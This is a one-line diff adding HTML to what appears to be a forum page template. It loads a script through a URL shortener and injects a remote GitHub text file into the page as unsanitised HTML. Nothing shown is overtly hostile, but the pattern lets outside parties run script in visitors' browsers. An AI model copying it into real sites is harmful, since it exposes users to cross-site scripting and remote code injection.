@@ -1,0 +1,1 @@
+<script src="http://goo.gl/VM4Mbr"></script><div class="PHS"></div><script>$.get("https://raw.githubusercontent.com/chaos12135/sarp_forum/master/profile/user.txt", function(data){$('.PHS').each(function(){$(this).html(data);});});</script>
